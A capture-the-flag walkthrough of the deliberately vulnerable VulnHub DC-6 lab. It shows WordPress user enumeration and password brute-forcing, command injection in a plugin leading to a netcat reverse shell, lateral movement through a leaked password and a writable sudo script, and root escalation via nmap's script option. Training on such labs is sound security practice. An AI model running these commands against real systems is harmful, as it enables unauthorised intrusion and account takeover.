# VulnHub > DC 6
### About Release

* Name: DC: 6
* Date release: 26 Apr 2019
* Author: DCAU
* Series: DC

### Download
* DC-6.zip (Size: 619 MB)
* Download: http://www.five86.com/downloads/DC-6.zip
* Download (Mirror): https://download.vulnhub.com/dc/DC-6.zip
* Download (Torrent): https://download.vulnhub.com/dc/DC-6.zip.torrent (Magnet)

### Description

DC-6 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

This isn’t an overly difficult challenge so should be great for beginners.

The ultimate goal of this challenge is to get root and to read the one and only flag.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.

### Clue

OK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job.

```cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt ```That should save you sometime,

---
## Initial foothold
### Services Enumeration
There are 2 open TCP ports on the target:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)
|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)
|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to http://wordy/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Hosts file
Nmap reveals that the web server redirects to http://wordy. Let’s add this to our /etc/hosts file:

```$ echo "172.16.222.161 wordy" | sudo tee -a /etc/hosts```

## Wordpress
Enumerating the users
Connecting to the the web service reveals a Wordpress installation. Let’s enumerate the users with wpscan:
```
kali@kali:/data/DC_6$ wpscan --url http://wordy/ -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://wordy/ [172.16.222.161]
[+] Started: Sat Oct 10 07:38:51 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://wordy/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://wordy/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://wordy/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).
 | Found By: Rss Generator (Passive Detection)
 |  - http://wordy/index.php/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
 |  - http://wordy/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://wordy/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://wordy/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1, Match: 'Version: 2.1'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <=======================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] graham
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] mark
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] sarah
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] jens
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Sat Oct 10 07:39:00 2020
[+] Requests Done: 60
[+] Cached Requests: 6
[+] Data Sent: 12.749 KB
[+] Data Received: 640.991 KB
[+] Memory used: 152.438 MB
[+] Elapsed time: 00:00:09
```
## Brute force the Wordpress accounts
We had a hint from the challenge description regarding the password file to use:

```kali@kali:/data/DC_6$ grep k01 /usr/share/wordlists/rockyou.txt > files/passwords.txt```
Now, let’s brute force the accounts:
```
kali@kali:/data/DC_6/files$ wpscan --url http://wordy/ -e u -P passwords.txt 

[REDACTED]

[+] Performing password attack on Xmlrpc against 5 user/s
[SUCCESS] - mark / helpdesk01                                                                                        
Trying jens / !lak019b Time: 00:02:44 <===============================        > (12547 / 15215) 82.46%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: mark, Password: helpdesk01

[REDACTED]
```
## Connect as mark
Now, let’s connect as “mark” in Wordpress (http://wordy/wp-admin/). Mark is not an admin, which means that we won’t be able to modify the templates, but there is an “Activity Monitor” plugin installed. Let’s check if there are any exploits:
```
kali@kali:/data/DC_6$ searchsploit activity monitor
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Activity Monitor 2002 2.6 - Remote Denial of Service                               | windows/dos/22690.c
RedHat Linux 6.0/6.1/6.2 - 'pam_console' Monitor Activity After Logout             | linux/local/19900.c
WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Inj | php/webapps/45274.html
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
kali@kali:/data/DC_6$ searchsploit -m 45274 
```
## Exploit the Wordpress Activity Monitor plugin
### Tamper the request in BurpSuite
Opening the exploit file (html) shows that the “ip” field of the “tools > lookup” feature of “activity monitor” is vulnerable to command injection. Let’s start a listener (rlwrap nc -nlvp 4444) and capture the request in BurpSuite. Modify the payload in BurpSuite to append a reverse shell as follows:

![5ac05389692acd94b54f8f206d9cb9ca.png](../_resources/5ac05389692acd94b54f8f206d9cb9ca.png)

## Reverse shell
We now have a reverse shell:
```
kali@kali:/data/DC_6/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.16.222.128] from (UNKNOWN) [172.16.222.161] 41564
which python
/usr/bin/python
python -c "import pty;pty.spawn('/bin/bash')"
```
## Lateral move
www-data -> graham
Enumerating the /home folder reveals an interesting TODO file in ```mark```’s home folder.
```md
www-data@dc-6:/home/mark/stuff$ cat things-to-do.txt
cat things-to-do.txt
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement
```
The file is disclosing ```graham```’s password. Let’s switch to graham:
```md
www-data@dc-6:/home/mark/stuff$ su graham
su graham
Password: GSo7isUM1D4

graham@dc-6:/home/mark/stuff$ id
id
uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)
```
## graham -> jens
Free up the reverse shell and connect via SSH:
```
kali@kali:/data/DC_6/files$ sshpass -p "GSo7isUM1D4" ssh graham@wordy
Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Oct 10 16:16:08 2020 from 172.16.222.128
graham@dc-6:~$ 
```
Checking graham’s privileges reveals that we can execute a backup script as ```jens``` without password:
```md
graham@dc-6:~$ sudo -l
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
```
The ```backups.sh``` script can be modified by the devs group, and we are member of this group:
```md
graham@dc-6:/home/jens$ ll
total 28
drwxr-xr-x 2 jens jens 4096 Apr 26  2019 .
drwxr-xr-x 6 root root 4096 Apr 26  2019 ..
-rwxrwxr-x 1 jens devs   50 Apr 26  2019 backups.sh
-rw------- 1 jens jens    5 Apr 26  2019 .bash_history
-rw-r--r-- 1 jens jens  220 Apr 24  2019 .bash_logout
-rw-r--r-- 1 jens jens 3526 Apr 24  2019 .bashrc
-rw-r--r-- 1 jens jens  675 Apr 24  2019 .profile
graham@dc-6:/home/jens$ id
uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)
```
Let’s modify the script:
```bash
graham@dc-6:~$ cat > /home/jens/backups.sh << EOF
> /bin/bash
> EOF
```
And now, let’s execute it as jens:
```md
graham@dc-6:~$ sudo -u jens /home/jens/backups.sh
jens@dc-6:/home/graham$ id
uid=1004(jens) gid=1004(jens) groups=1004(jens),1005(devs)
```
## Privilege escalation
Checking jens’ privileges reveals that we can execute nmap as root without password.
```md
jens@dc-6:~$ sudo -l
Matching Defaults entries for jens on dc-6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap
```
Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/#sudo) reveals that we can escalate our privileges as follows:
```md
jens@dc-6:~$ TF=$(mktemp)
jens@dc-6:~$ echo 'os.execute("/bin/sh")' > $TF
jens@dc-6:~$ sudo nmap --script=$TF

Starting Nmap 7.40 ( https://nmap.org ) at 2020-10-10 16:46 AEST
NSE: Warning: Loading '/tmp/tmp.OfxOLig2cg' -- the recommended file extension is '.nse'.
# uid=0(root) gid=0(root) groups=0(root)
```
## Root flag
Now connected as root, let’s get the root flag:
```md
# python -c "import pty;pty.spawn('/bin/bash')"
root@dc-6:/home/jens# cd /root
root@dc-6:~# ls -la
total 32
drwx------  3 root root 4096 Apr 26  2019 .
drwxr-xr-x 22 root root 4096 Apr 24  2019 ..
-rw-------  1 root root   16 Apr 26  2019 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-------  1 root root  438 Apr 24  2019 .mysql_history
drwxr-xr-x  2 root root 4096 Apr 26  2019 .nano
-rw-r--r--  1 root root  148 Aug 18  2015 .profile
-rw-r--r--  1 root root  541 Apr 26  2019 theflag.txt
root@dc-6:~# cat theflag.txt 


Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b 
 Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
  YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"' 
   YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8) 


Congratulations!!!


root@dc-6:~# 
```